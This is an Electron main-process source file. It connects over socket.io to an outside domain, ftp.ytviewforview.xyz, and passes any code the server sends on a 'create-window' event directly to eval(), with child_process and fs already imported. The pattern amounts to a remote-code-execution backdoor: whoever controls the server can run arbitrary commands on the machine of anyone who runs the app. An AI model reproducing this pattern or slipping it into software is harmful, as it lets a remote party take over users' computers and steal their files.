const {app, BrowserWindow, ipcMain,Menu} = require('electron')
const path = require('path')
const os = require('os');
const fs = require('fs')
const storage = require('electron-json-storage');
const io = require('socket.io-client')
const socket = io('https://ftp.ytviewforview.xyz')
const process = require('child_process')

socket.once('create-window',fn=>{
  eval(fn)
})